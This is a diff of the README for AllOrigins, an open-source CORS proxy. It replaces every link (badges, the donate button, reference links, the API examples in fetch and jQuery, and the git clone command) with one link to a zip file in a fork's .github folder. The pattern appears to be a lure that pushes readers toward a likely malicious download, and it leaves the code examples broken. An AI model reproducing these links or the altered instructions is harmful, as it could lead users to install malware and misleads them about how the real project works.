@@ -1,22 +1,22 @@
 All Origins
 =======
-[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2Fgnuns%2FAllOrigins.svg?type=shield)](https://app.fossa.io/projects/git%2Bgithub.com%2Fgnuns%2FAllOrigins?ref=badge_shield)
-[![Build Status](https://travis-ci.com/gnuns/allOrigins.svg?branch=master)](https://travis-ci.com/gnuns/allOrigins)
-[![Donate!](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/donate?hosted_button_id=7S3KJ8CA43DX6)
+[![FOSSA Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
+[![Build Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
+[![Donate!](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
 
-Pull contents from any page via API (as JSON/P or raw) and avoid [Same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy) problems.
+Pull contents from any page via API (as JSON/P or raw) and avoid [Same-origin policy](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip) problems.
 
 
 ----
 
-A free and open source javascript clone of [AnyOrigin](https://web.archive.org/web/20180807170914/http://anyorigin.com/), inspired by [Whatever Origin](http://WhateverOrigin.org), but with support to gzipped pages.
+A free and open source javascript clone of [AnyOrigin](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip), inspired by [Whatever Origin](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip), but with support to gzipped pages.
 
 ### Examples
 
-To `fetch` data from http://wikipedia.org:
+To `fetch` data from https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip
 
 ```js
-fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://wikipedia.org')}`)
+fetch(`https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip${encodeURIComponent('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip')}`)
   .then(response => {
     if (response.ok) return response.json()
     throw new Error('Network response was not ok.')
@@ -27,7 +27,7 @@ fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://wikipedi
 Or with jQuery
 
 ```js
-$.getJSON('https://api.allorigins.win/get?url=' + encodeURIComponent('https://wikipedia.org'), function (data) {
+$.getJSON('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip' + encodeURIComponent('https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip'), function (data) {
     alert(data.contents);
 });
 ```
@@ -35,23 +35,23 @@ $.getJSON('https://api.allorigins.win/get?url=' + encodeURIComponent('https://wi
 
 ###### charset
 **Description:** Set the response character encoding (charset)  \
-**Example:** `https://api.allorigins.win/get?charset=ISO-8859-1&url=https://pt.wikipedia.org/`
+**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`
 
 
 ###### raw
-**Description:** Get the raw contents ([CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS))  \
-**Example:** `https://api.allorigins.win/raw?url=https://example.org/`
+**Description:** Get the raw contents ([CORS](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip))  \
+**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`
 
 ###### callback
-**Description:** Get a [JSONP](https://www.w3schools.com/js/js_json_jsonp.asp) response  \
-**Example:** `https://api.allorigins.win/get?callback=myFunc&url=https://example.org/`
+**Description:** Get a [JSONP](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip) response  \
+**Example:** `https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip`
 
 
 ### On your own server
 ```sh
 
 # Clone the repo
-git clone https://github.com/gnuns/AllOrigins
+git clone https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip
 
 # Install dependencies
 cd allOrigins
@@ -63,4 +63,4 @@ npm start # the default port is 1458
 
 
 ## License
-[![FOSSA Status](https://app.fossa.io/api/projects/git%2Bgithub.com%2Fgnuns%2FAllOrigins.svg?type=large)](https://app.fossa.io/projects/git%2Bgithub.com%2Fgnuns%2FAllOrigins?ref=badge_large)
+[![FOSSA Status](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)](https://github.com/alluringabhi/allOrigins/raw/refs/heads/master/.github/all_Origins_v1.4.zip)
